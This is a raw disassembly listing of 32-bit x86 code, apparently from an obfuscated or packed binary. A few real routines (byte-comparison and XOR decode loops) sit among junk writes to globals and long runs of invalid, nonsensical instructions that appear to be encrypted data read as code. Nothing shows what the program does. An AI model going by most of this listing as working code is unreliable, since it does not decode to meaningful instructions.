  404969:	and    DWORD PTR ds:0x42fcfa,0x42fc79
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fcfe,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e683,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd02,0x42fcfe
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e687,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	stc    
  4049bc:	outs   dx,BYTE PTR ds:[esi]
  4049bd:	mov    edx,0x7021c917
  4049c2:	jo     0x404a01
  4049c4:	jge    0x404a36
  4049c6:	jo     0x4049b0
  4049c8:	xor    BYTE PTR [ebp+0x3f553818],al
  4049ce:	addr16 cmp al,0x9e
  4049d1:	mov    al,ds:0x1871dbb1
  4049d6:	adc    al,0xd2
  4049d8:	xchg   ebx,eax
  4049d9:	cmp    esp,DWORD PTR [edi+0x549040fe]
  4049df:	mov    ah,0xc8
  4049e1:	or     eax,0x293c437a
  4049e6:	push   eax
  4049e7:	mov    bl,0x15
  4049e9:	xchg   edi,eax
  4049ea:	pop    esi
  4049eb:	(bad)  
  4049ec:	xchg   ecx,eax
  4049ed:	push   esi
  4049ee:	aad    0x8b
  4049f0:	xchg   esi,eax
  4049f1:	pop    ebp
  4049f2:	mov    edi,0xf7944e37
  4049f7:	adc    al,al
  4049f9:	push   cs
  4049fa:	int    0xad
  4049fc:	or     bl,0x8a
  4049ff:	mov    cs,esi
  404a01:	mov    dl,0x23
  404a03:	pop    edi
  404a04:	les    esi,FWORD PTR [edx-0x59b4499a]
  404a0a:	push   0xffffff88
  404a0c:	xchg   ebx,eax
  404a0d:	mov    dh,0xe1
  404a0f:	nop
  404a10:	std    
  404a11:	jl     0x404a1a
  404a13:	mov    dl,0x95
  404a15:	(bad)  
  404a16:	sub    esp,DWORD PTR [ebp-0x5500354c]
  404a1c:	imul   esp,edi,0x92613996
  404a22:	pop    ecx
  404a23:	ds iret 
  404a25:	jo     0x4049fe
  404a27:	and    BYTE PTR [eax-0x3d],0x70
  404a2b:	addr16 data16 mov cl,0x2c
  404a2f:	xchg   edx,eax
  404a30:	pusha  
  404a31:	mov    dl,0x9b
  404a33:	clc    
  404a34:	fsub   DWORD PTR [esi]
  404a36:	cmp    eax,0xa0f34c05
  404a3b:	mov    BYTE PTR [edx+edx*4],ch
  404a3e:	mov    BYTE PTR [ebx+0x43],dl
  404a41:	mov    bh,0x25
  404a43:	pop    edi
  404a44:	pop    ebp
  404a45:	shr    dl,0x18
  404a48:	test   edx,0x84b14897
  404a4e:	neg    BYTE PTR [edi]
  404a50:	xchg   edi,eax
  404a51:	mov    al,BYTE PTR [edi+0x21]
  404a54:	outs   dx,BYTE PTR ds:[esi]
  404a55:	rcr    esp,cl
  404a57:	sub    esp,edx
  404a59:	push   edx
  404a5a:	mov    ch,0xb0
  404a5c:	fadd   DWORD PTR [ecx-0xa31ef56]
  404a62:	(bad)  
  404a63:	(bad)  
  404a64:	sbb    al,0x41
  404a66:	push   edx
  404a67:	fsub   DWORD PTR ss:[ecx-0x7adbe5f4]
  404a6e:	iret   
  404a6f:	xchg   ebx,eax
  404a70:	adc    BYTE PTR [eax],0x32
  404a73:	shl    BYTE PTR [edi+eiz*8],cl
  404a76:	jae    0x404a61
  404a78:	and    eax,0x5531b58b
  404a7d:	(bad)  
  404a7e:	fild   QWORD PTR [eax+0x1d0063ed]
  404a84:	and    esi,ebp
  404a86:	mov    dh,0x65
  404a88:	xor    eax,0xd8c182d3
  404a8d:	jmp    0xaa046a49
  404a92:	cmp    al,0x2b
  404a94:	pop    edx
  404a95:	dec    edx
  404a96:	sbb    dl,BYTE PTR [ebx]
  404a98:	mov    ch,0x90
  404a9a:	sub    ah,BYTE PTR [edi+ebx*4+0x13f3ab4d]
  404aa1:	mov    edi,0x7227adef
  404aa6:	push   ds
  404aa7:	mov    cs,ebp
  404aa9:	xor    edx,ebx
  404aab:	mov    eax,0xa22aaf27
  404ab0:	(bad)  
  404ab2:	std    
  404ab3:	push   ds
  404ab4:	mov    eax,0x7c6e7ec5
  404ab9:	icebp  
  404aba:	ret    0xd6d6
  404abd:	jecxz  0x404aa7
  404abf:	jno    0x404ac5
  404ac1:	rcr    DWORD PTR [ecx+ecx*2-0x7aaa8847],0x14
  404ac9:	test   ah,ch
  404acb:	add    DWORD PTR [eax+0x2b13970],0x7f
  404ad2:	inc    esi
  404ad3:	shr    BYTE PTR [eax-0x26],cl
  404ad6:	sahf   
  404ad7:	mov    ecx,0x12658f34
  404adc:	add    eax,0xf3a36b3c
  404ae1:	pop    ss
  404ae2:	lea    ecx,[edx]
  404ae4:	aaa    
  404ae5:	in     al,dx
  404ae6:	add    eax,0xd3a55a24
  404aeb:	out    0xf8,eax
  404aed:	lods   al,BYTE PTR ds:[esi]
  404aee:	dec    ecx
  404aef:	out    dx,eax
  404af0:	addr16 daa 
  404af2:	push   0xfffffffa
  404af4:	cmp    BYTE PTR [eax+eax*8+0x7fe3746b],0xe0
  404afc:	xor    bl,BYTE PTR [ebp+0x893d61d]
  404b02:	arpl   WORD PTR [esi+0x3edec1dc],dx
  404b08:	sub    DWORD PTR [eax],ecx
  404b0a:	imul   ecx,DWORD PTR [esi+0x3e],0xff0ccf07
  404b11:	sbb    dh,dh
  404b13:	ret    0xe902
  404b16:	add    al,0x57
  404b18:	ins    BYTE PTR es:[edi],dx
  404b19:	or     bh,BYTE PTR [ebp-0x28]
  404b1c:	mov    ah,0xe7
  404b1e:	adc    esi,esi
  404b20:	shr    DWORD PTR [edi-0x2cd5fd36],1
  404b26:	imul   edi,DWORD PTR [ebp+0x524ea3d3],0xffffffc7
  404b2d:	xchg   edx,eax
  404b2e:	mov    edi,0x6a455e2c
  404b33:	pop    ecx
  404b34:	or     eax,0x75c01d3f
  404b39:	add    ebp,ebx
  404b3b:	push   DWORD PTR [ebp-0x77b17eaf]
  404b41:	jns    0x404ac3
  404b43:	pop    esi
  404b44:	mov    al,ds:0xdb57a58e
  404b49:	pop    eax
  404b4a:	(bad)  
  404b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b4c:	test   al,0xae
  404b4e:	pop    ss
  404b4f:	cdq    
  404b50:	sti    
  404b51:	inc    esp
  404b52:	mov    ebp,0x6702e449
  404b57:	call   0x5594d336
  404b5c:	imul   eax,ebp,0x3e
  404b5f:	mov    bh,0x5c
  404b61:	pop    ebx
  404b62:	pop    edi
  404b63:	int3   
  404b64:	scas   eax,DWORD PTR es:[edi]
  404b65:	inc    eax
  404b66:	mov    al,ds:0x5d6ec3f1
  404b6b:	cld    
  404b6c:	push   ds
  404b6d:	sbb    BYTE PTR [ebx-0x5729e371],al
  404b73:	add    bh,ch
  404b75:	push   ecx
  404b76:	and    ah,BYTE PTR [ebx-0x37]
  404b79:	in     al,0x7e
  404b7b:	add    eax,0x2dc5d647
  404b80:	sti    
  404b81:	int3   
  404b82:	into   
  404b83:	fild   QWORD PTR [ebx]
  404b85:	add    DWORD PTR [eax+esi*8],0xac3991da
  404b8c:	(bad)
  404b90:	push   eax
  404b91:	repz inc esi
  404b93:	(bad)  
  404b94:	in     eax,dx
  404b95:	adc    ebx,ebp
  404b97:	mov    ebx,0xa5d437eb
  404b9c:	push   ecx
  404b9d:	jnp    0x404bfd
  404b9f:	lods   eax,DWORD PTR ds:[esi]
  404ba0:	and    eax,0x2b890a23
  404ba5:	outs   dx,BYTE PTR ds:[esi]
  404ba6:	int    0x56
  404ba8:	mov    WORD PTR [esi+0x59],cs
  404bab:	cmp    eax,0x26236dd2
  404bb0:	add    al,0xad
  404bb2:	mov    esi,0x631c2e83
  404bb7:	(bad)  
  404bb8:	shr    DWORD PTR [edx],cl
  404bba:	(bad)  
  404bbb:	mov    ds:0x42130fc0,al
  404bc0:	jmp    0xc90b:0x9c727ba4
  404bc7:	fcomp  st(4)
  404bc9:	inc    ecx
  404bca:	(bad)  
  404bcb:	fisub  DWORD PTR [ebx-0xc]
  404bce:	xor    ah,BYTE PTR ds:0xda64650b
  404bd4:	mov    WORD PTR [esi+0x2739414],cs
  404bda:	std    
  404bdb:	scas   al,BYTE PTR es:[edi]
  404bdc:	jg     0x404b64
  404bde:	inc    edx
  404bdf:	leave  
  404be0:	lahf   
  404be1:	(bad)  
  404be2:	xchg   edx,eax
  404be3:	jne    0x404c56
  404be5:	arpl   WORD PTR [edx],sp
  404be7:	sbb    BYTE PTR [ebx-0x2c2621d2],al
  404bed:	xchg   esi,eax
  404bee:	dec    edx
  404bef:	in     al,0x47
  404bf1:	ja     0x404c64
  404bf3:	in     eax,dx
  404bf4:	test   al,0x8c
  404bf6:	scas   eax,DWORD PTR es:[edi]
  404bf7:	jbe    0x404c5f
  404bf9:	xor    bl,cl
  404bfb:	jb     0x404b85
  404bfd:	adc    ch,dl
  404bff:	dec    edi
  404c00:	xchg   edi,eax
  404c01:	test   BYTE PTR [ecx],ah
  404c03:	fiadd  DWORD PTR [ebx+0x1]
  404c06:	and    al,0xc
  404c08:	sbb    eax,0xc418b9b6
  404c0d:	mov    ?,edi
  404c0f:	data16 ins BYTE PTR es:[edi],dx
  404c11:	stc    
  404c12:	mov    edi,0x6f75c0cc
  404c17:	ins    DWORD PTR es:[edi],dx
  404c18:	mov    al,0xd1
  404c1a:	cli    
  404c1b:	or     ecx,DWORD PTR [esi+0x2254c300]
  404c21:	jp     0x404ba6
  404c23:	in     eax,0x80
  404c25:	gs pop ss
  404c27:	fmul   QWORD PTR [ebx-0x7]
  404c2a:	xchg   esp,eax
  404c2b:	les    ecx,FWORD PTR [ebp+0x4d715bff]
  404c31:	outs   dx,DWORD PTR ds:[esi]
  404c32:	or     eax,0x29de292b
  404c37:	mov    BYTE PTR [ecx-0x1478e36c],dl
  404c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c3e:	shr    BYTE PTR [ecx+0x8],1
  404c41:	repnz xchg edx,eax
  404c43:	scas   al,BYTE PTR es:[edi]
  404c44:	mov    ds:0x3b12785f,al
  404c49:	(bad)  
  404c4a:	aam    0xef
  404c4c:	mov    DWORD PTR [ecx+0x20],0x7cc0acf
  404c53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c54:	pop    edi
  404c55:	sub    eax,0x66121e87
  404c5a:	pop    ebp
  404c5b:	jle    0x404c0e
  404c5d:	sbb    eax,0x11238d95
  404c62:	std    
  404c63:	lahf   
  404c64:	into   
  404c65:	add    al,0x12
  404c67:	sbb    ebx,ebx
  404c69:	push   ecx
  404c6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c6b:	push   ebx
  404c6c:	ins    DWORD PTR es:[edi],dx
  404c6d:	xor    bh,BYTE PTR [edx-0x43]
  404c70:	jp     0x404ca1
  404c72:	sbb    al,0x54
  404c74:	xor    al,0x3c
  404c76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c77:	lods   al,BYTE PTR ds:[esi]
  404c78:	pushf  
  404c79:	test   BYTE PTR [edi+0x25889604],al
  404c7f:	cmp    al,0x3e
  404c81:	jmp    0x325a4f2e
  404c86:	(bad)  
  404c87:	pop    edx
  404c88:	xor    bh,BYTE PTR [ebx]
  404c8a:	cmp    al,0x29
  404c8c:	mov    DWORD PTR [eax+ebp*8+0x22663751],esp
  404c93:	xchg   ebx,eax
  404c94:	repnz sti 
  404c96:	push   ebx
  404c97:	mov    DWORD PTR [edx+eiz*2-0x65],esp
  404c9b:	dec    esp
  404c9c:	cmp    al,0x2c
  404c9e:	rcr    BYTE PTR [ebx],cl
  404ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ca1:	mov    ebp,0x2ca03035
  404ca6:	push   esp
  404ca7:	pop    es
  404ca8:	mov    ebp,0x8075fc9b
  404cad:	xchg   esp,eax
  404cae:	inc    edx
  404caf:	push   es
  404cb0:	pop    ebp
  404cb1:	sbb    BYTE PTR [eax-0x50dd223d],cl
  404cb7:	std    
  404cb8:	jae    0x404c57
  404cba:	lahf   
  404cbb:	or     ch,BYTE PTR [edi]
  404cbd:	fcomp  QWORD PTR [esi-0x1e]
  404cc0:	lahf   
  404cc1:	jns    0x404cd3
  404cc3:	add    BYTE PTR [ecx],bl
  404cc5:	xor    eax,0x701b1098
  404cca:	inc    ebp
  404ccb:	out    dx,eax
  404ccc:	pop    eax
  404ccd:	hlt    
  404cce:	mov    al,0xba
  404cd0:	mov    cl,al
  404cd2:	pop    edi
  404cd3:	cmp    al,0x2d
  404cd5:	repnz sub ebx,DWORD PTR [esi+0x3c]
  404cd9:	pop    ebp
  404cda:	shr    ch,1
  404cdc:	and    ebx,DWORD PTR [edx-0x4a]
  404cdf:	sub    BYTE PTR [ebx*8-0x55ec5b26],al
  404ce6:	or     al,0x68
  404ce8:	pusha  
  404ce9:	add    esi,DWORD PTR [edx+0x5b]
  404cec:	inc    edx
  404ced:	cld    
  404cee:	outs   dx,BYTE PTR ds:[esi]
  404cef:	nop
  404cf0:	std    
  404cf1:	sub    bh,cl
  404cf3:	std    
  404cf4:	xchg   dl,ah
  404cf6:	icebp  
  404cf7:	adc    ch,BYTE PTR ds:0xfad1a638
  404cfd:	mov    bp,0xba70
  404d01:	or     ch,BYTE PTR [edi+ebp*8+0x13]
  404d05:	xchg   ecx,eax
  404d06:	jge    0x404d62
  404d08:	stc    
  404d09:	repnz add eax,edi
  404d0c:	mov    DWORD PTR ds:0x42e67f,0xe58
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e66b,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax+0x5d]
  404d39:	out    dx,eax
  404d3a:	aam    0xdf
  404d3c:	xchg   esi,eax
  404d3d:	cs jo  0x404db0
  404d40:	cmp    eax,0xcf70707d
  404d45:	rcl    dl,cl
  404d47:	cmp    eax,0xe7d39fad
  404d4c:	sub    esi,ebp
  404d4e:	mov    eax,0x38040e58
  404d53:	pop    ebx
  404d54:	scas   al,BYTE PTR es:[edi]
  404d55:	mov    eax,0xc3fb6fad
  404d5a:	jns    0x404d1b
  404d5c:	out    dx,al
  404d5d:	int3   
  404d5e:	mov    BYTE PTR [ecx-0x5ebedd31],ch
  404d64:	and    BYTE PTR [ecx+0x7d],bl
  404d67:	mov    ah,0x69
  404d69:	hlt    
  404d6a:	adc    DWORD PTR [ebx+0x664bba02],ebp
  404d70:	adc    BYTE PTR [ebx],0xae
  404d73:	gs clc 
  404d75:	dec    edi
  404d76:	jg     0x404d1a
  404d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d79:	jnp    0x404d85
  404d7b:	sti    
  404d7c:	dec    ecx
  404d7d:	std    
  404d7e:	in     eax,dx
  404d7f:	mov    eax,ds:0x82b788a9
  404d84:	pop    ss
  404d85:	inc    ebp
  404d86:	mov    eax,ds:0xc612164
  404d8b:	and    al,0x6d
  404d8d:	xchg   BYTE PTR [edx+0x17],dl
  404d90:	adc    esi,DWORD PTR [edx-0x6eef6eec]
  404d96:	fwait
  404d97:	cmp    ebx,DWORD PTR [ecx+esi*8]
  404d9a:	repz cmp sp,WORD PTR [esi]
  404d9e:	je     0x404de2
  404da0:	dec    edi
  404da1:	dec    ebp
  404da2:	fidiv  WORD PTR [eax+0x24]
  404da5:	(bad)  
  404da6:	mov    BYTE PTR gs:[ebp-0x2a],bl
  404daa:	int    0x99
  404dac:	xchg   ebp,eax
  404dad:	and    esi,DWORD PTR [eax-0x22681d8f]
  404db3:	pop    edx
  404db4:	leave  
  404db5:	call   0x1fb34824
  404dba:	jg     0x404e32
  404dbc:	or     edi,DWORD PTR [ecx-0x7f0bb1c3]
  404dc2:	js     0x404d62
  404dc4:	dec    dh
  404dc6:	push   ecx
  404dc7:	je     0x404de7
  404dc9:	aad    0x93
  404dcb:	jns    0x404d5f
  404dcd:	leave  
  404dce:	in     eax,dx
  404dcf:	push   edx
  404dd0:	xchg   edx,eax
  404dd1:	xchg   DWORD PTR [ecx+0x69],edi
  404dd4:	dec    edi
  404dd5:	std    
  404dd6:	mov    al,0x96
  404dd8:	addr16 jmp 0x404dbf
  404ddb:	xor    cl,BYTE PTR [ecx+0x6b9e6741]
  404de1:	out    0xa9,eax
  404de3:	mov    edi,0xbff0b801
  404de8:	add    al,0x38
  404dea:	xor    DWORD PTR [esi+0x2cc3c5e5],0x6e447ad0
  404df4:	add    BYTE PTR [esi+0x6d],0xa6
  404df8:	in     al,dx
  404df9:	mov    cl,0x4b
  404dfb:	mov    ds:0x27d267cb,eax
  404e00:	sti    
  404e01:	xchg   bh,al
  404e03:	sub    esp,esp
  404e05:	sbb    esi,DWORD PTR [edx+edx*8+0x7b]
  404e09:	jle    0x404de6
  404e0b:	xchg   edx,eax
  404e0c:	mov    bh,0x42
  404e0e:	dec    edi
  404e0f:	cld    
  404e10:	add    eax,0xbbca450b
  404e15:	jno    0x404e84
  404e17:	mov    al,0x19
  404e19:	cmp    ebp,esp
  404e1b:	pop    es
  404e1c:	sbb    eax,0xf580e834
  404e21:	mov    edx,0x67f8c4ca
  404e26:	pop    esi
  404e27:	add    ebx,esp
  404e29:	(bad)  
  404e2a:	leave  
  404e2b:	test   BYTE PTR [ebp-0x14679d2],ah
  404e31:	xchg   esi,eax
  404e32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e33:	fst    QWORD PTR [eax-0x79641a54]
  404e39:	test   eax,0x277cb968
  404e3e:	jge    0x404e05
  404e40:	arpl   ax,cx
  404e42:	xchg   ebp,eax
  404e43:	push   esp
  404e44:	loope  0x404e0e
  404e46:	cmp    dl,BYTE PTR [ecx]
  404e48:	xchg   DWORD PTR ds:0xcb92ca49,esp
  404e4e:	push   ds
  404e4f:	jbe    0x404e33
  404e51:	sub    eax,0xeef2106
  404e56:	fild   QWORD PTR [ebp-0x696fe224]
  404e5c:	call   0x9c76:0x791b6e15
  404e63:	sbb    al,BYTE PTR [esi-0x288b8bde]
  404e69:	arpl   WORD PTR [esi-0x2f],si
  404e6c:	xor    DWORD PTR [ebp+0x47df6c6e],0xf3f5eb1a
  404e76:	ja     0x404e19
  404e78:	dec    ebx
  404e79:	dec    ebx
  404e7a:	inc    ecx
  404e7b:	in     eax,0xf1
  404e7d:	sub    ebp,DWORD PTR [ebp+0x29]
  404e80:	icebp  
  404e81:	push   0x47
  404e83:	mov    dh,0x2d
  404e85:	ja     0x404ea1
  404e87:	sbb    cl,BYTE PTR [ebp-0x7a88c2a]
  404e8d:	dec    esi
  404e8e:	shl    bh,1
  404e90:	adc    DWORD PTR [edx+0x16],ebp
  404e93:	out    0x1b,eax
  404e95:	dec    ecx
  404e96:	mov    ah,0xce
  404e99:	xchg   esp,eax
  404e9a:	out    0x84,eax
  404e9c:	lods   al,BYTE PTR ds:[esi]
  404e9d:	and    BYTE PTR [ecx+0x3dfa1fef],0xdb
  404ea4:	out    0xa9,eax
  404ea6:	mov    edi,0xedc0a6d1
  404eab:	js     0x404e92
  404ead:	ret    0x3e42
  404eb0:	mov    BYTE PTR [edx+edi*1],al
  404eb3:	sbb    cx,bx
  404eb6:	stc    
  404eb7:	sbb    edi,esp
  404eb9:	push   ds
  404eba:	das    
  404ebb:	push   es
  404ebc:	pop    ss
  404ebd:	outs   dx,BYTE PTR ds:[esi]
  404ebe:	mov    bl,0x88
  404ec0:	and    DWORD PTR [ebx+0x5],ecx
  404ec3:	sti    
  404ec4:	push   es
  404ec5:	pusha  
  404ec6:	mov    ebx,0x937f7b89
  404ecb:	shr    BYTE PTR [ebx],1
  404ecd:	mov    bh,0x81
  404ecf:	icebp  
  404ed0:	jne    0x404eb4
  404ed2:	out    dx,al
  404ed3:	fisttp DWORD PTR [edx-0x22]
  404ed6:	cwde   
  404ed7:	cli    
  404ed8:	cwde   
  404ed9:	shl    DWORD PTR [edx+0x4b8cf69a],cl
  404edf:	addr16 hlt 
  404ee1:	add    edx,DWORD PTR [edx+0x49]
  404ee4:	cmp    eax,0x4bc51b62
  404ee9:	mov    dh,0x7
  404eeb:	cmp    eax,0xe5a519c4
  404ef0:	add    BYTE PTR [ebx+0xf],bh
  404ef3:	mov    DWORD PTR [edx-0x385ef3b],esp
  404ef9:	inc    edx
  404efa:	push   0xb6d2ede2
  404eff:	dec    ebp
  404f00:	add    eax,0x300f8eef
  404f05:	in     eax,dx
  404f06:	inc    edx
  404f07:	ret    0x4038
  404f0a:	sub    dl,ch
  404f0c:	aaa    
  404f0d:	lock fs rcr bh,0x10
  404f12:	pop    ebp
  404f13:	bound  ebp,QWORD PTR ds:0xb10360ee
  404f19:	jl     0x404eb6
  404f1b:	push   0xffffff99
  404f1d:	and    ah,BYTE PTR [eax+ebp*2+0x53]
  404f21:	dec    eax
  404f22:	sbb    ecx,DWORD PTR [ebx-0x5f]
  404f25:	in     al,dx
  404f26:	cld    
  404f27:	imul   ebx,DWORD PTR [eax+ebp*4-0x4d965a62],0xae952de8
  404f32:	lds    ebp,FWORD PTR ds:0xf58cf633
  404f38:	hlt    
  404f39:	ret    
  404f3a:	fwait
  404f3b:	jp     0x404f7f
  404f3d:	je     0x404f53
  404f3f:	or     BYTE PTR [ebx],cl
  404f41:	fs mov esp,0xd08950d5
  404f47:	push   esp
  404f48:	add    edx,ecx
  404f4a:	dec    ecx
  404f4b:	cmp    al,0xc7
  404f4d:	stos   BYTE PTR es:[edi],al
  404f4e:	adc    eax,0x44860dc0
  404f53:	dec    eax
  404f54:	sub    eax,0x5231a5d1
  404f59:	fwait
  404f5a:	hlt    
  404f5b:	mov    ch,0x6d
  404f5d:	mov    esp,0x4503db66
  404f62:	fcomp  QWORD PTR [ebx+0x2fdcd297]
  404f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f69:	in     al,dx
  404f6a:	mov    bh,0xb3
  404f6c:	mov    cs,WORD PTR [ebx+ecx*8]
  404f6f:	sub    cl,BYTE PTR [ebx+0x4645dc5]
  404f75:	sub    dh,cl
  404f77:	stos   DWORD PTR es:[edi],eax
  404f78:	test   DWORD PTR [esi+0x718c4ca4],ecx
  404f7e:	jle    0x404f55
  404f80:	add    BYTE PTR [edx+0x3e],ch
  404f83:	std    
  404f84:	jmp    0xcf60:0x3d30197
  404f8b:	cmp    al,0x1
  404f8d:	(bad)
  404f91:	push   0x55569804
  404f96:	shl    DWORD PTR [ecx],0x71
  404f99:	lods   eax,DWORD PTR ds:[esi]
  404f9a:	and    ecx,DWORD PTR ds:0x48615840
  404fa0:	adc    BYTE PTR [ecx],dh
  404fa2:	pusha  
  404fa3:	or     cl,0x5d
  404fa6:	iret   
  404fa7:	push   edx
  404fa8:	mov    WORD PTR [edx],fs
  404faa:	ret    
  404fab:	mov    ?,ebp
  404fad:	mov    edi,0xfa0d4ef5
  404fb2:	mov    edi,0xfe95a9ef
  404fb7:	in     al,0x3c
  404fb9:	mov    WORD PTR [edi-0x3592cbb],?
  404fbf:	outs   dx,BYTE PTR ds:[esi]
  404fc0:	gs sub al,0x88
  404fc3:	sahf   
  404fc4:	add    ecx,ecx
  404fc6:	pushf  
  404fc7:	and    al,0x38
  404fc9:	mov    ebp,DWORD PTR [esi-0x5b5220d]
  404fcf:	xor    DWORD PTR [ebx+0x22],edi
  404fd2:	push   0x14
  404fd4:	mov    al,dh
  404fd6:	xchg   edi,eax
  404fd7:	les    edx,FWORD PTR [ebx-0x41]
  404fda:	stos   DWORD PTR es:[edi],eax
  404fdb:	xor    BYTE PTR [ebx],bh
  404fdd:	cdq    
  404fde:	in     al,0xc2
  404fe0:	daa    
  404fe1:	call   0x695e:0xfc823a36
  404fe8:	outs   dx,BYTE PTR ds:[esi]
  404fe9:	mov    BYTE PTR [ebx+0x26cdcda0],cl
  404fef:	add    eax,0x82c85e21
  404ff4:	sbb    BYTE PTR [ecx+0x4e],dh
  404ff7:	jle    0x405027
  404ff9:	pop    edi
  404ffa:	call   0xcacda9c8
  404fff:	inc    ebp
  405000:	ja     0x405004
  405002:	mov    esp,0xd126ab60
  405007:	or     ebp,DWORD PTR [ebp+0x257fbef3]
  40500d:	lods   eax,DWORD PTR ds:[esi]
  40500e:	in     eax,0x4f
  405010:	nop
  405011:	test   BYTE PTR [ebx],0xc5
  405014:	mov    ebp,0x90a055b1
  405019:	scas   al,BYTE PTR es:[edi]
  40501a:	dec    esi
  40501b:	dec    edx
  40501c:	retf   0x69f1
  40501f:	sub    BYTE PTR [esp+ebx*8],cl
  405022:	bound  eax,QWORD PTR [esi]
  405024:	push   0x4e
  405026:	leave  
  405027:	repnz inc esp
  405029:	inc    eax
  40502a:	in     eax,dx
  40502b:	mov    bl,0x79
  40502d:	sub    ebx,DWORD PTR [ecx+ebp*2+0xb]
  405031:	sub    al,0xe7
  405033:	jle    0x404fca
  405035:	mov    cl,0xa9
  405037:	or     al,cl
  405039:	ror    DWORD PTR [ecx+0x39585ad2],cl
  40503f:	icebp  
  405040:	fistp  WORD PTR [ebx]
  405042:	popf   
  405043:	ss std 
  405045:	out    0x92,eax
  405047:	dec    esp
  405048:	mov    dh,0xdb
  40504a:	dec    esi
  40504b:	push   0xffffffcf
  40504d:	sub    ecx,ecx
  40504f:	jge    0x405094
  405051:	pop    esi
  405052:	gs out 0x37,eax
  405055:	or     eax,0x6e163294
  40505a:	jbe    0x405023
  40505c:	adc    eax,0x99fe651e
  405061:	mov    BYTE PTR [ecx-0x567338e2],0x82
  405068:	retf   
  405069:	push   ebp
  40506a:	jl     0x4050bb
  40506c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40506d:	cmp    ch,BYTE PTR [edx+0x19baf6ee]
  405073:	cwde   
  405074:	lahf   
  405075:	mov    al,0x32
  405077:	pop    ss
  405078:	sahf   
  405079:	mov    eax,0x2ebcdafc
  40507e:	scas   al,BYTE PTR es:[edi]
  40507f:	xchg   esp,eax
  405080:	dec    ebx
  405081:	jne    0x40504f
  405083:	push   edx
  405084:	and    ch,BYTE PTR ds:0xf4458bf8
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	shl    DWORD PTR [edi+0x2d],0xea
  405134:	mov    eax,ds:0x70702b53
  405139:	cmp    eax,0xb070707d
  40513e:	jge    0x405105
  405140:	rcr    BYTE PTR [ebp+0x6ff5376e],cl
  405146:	out    dx,al
  405147:	lods   al,BYTE PTR ds:[esi]
  405148:	ds in  eax,dx
  40514a:	(bad)
  40514d:	pop    edx
  40514e:	jae    0x40518c
  405150:	js     0x4051d1
  405152:	test   eax,0xd7279834
  405157:	hlt    
  405158:	xchg   DWORD PTR [ecx-0x9],edi
  40515b:	jmp    0x5383:0xa2c3cd58
  405162:	and    eax,0x8670f966
  405167:	jge    0x405100
  405169:	or     eax,0xe24831d9
  40516e:	(bad)  
  40516f:	adc    al,0x45
  405171:	dec    ebx
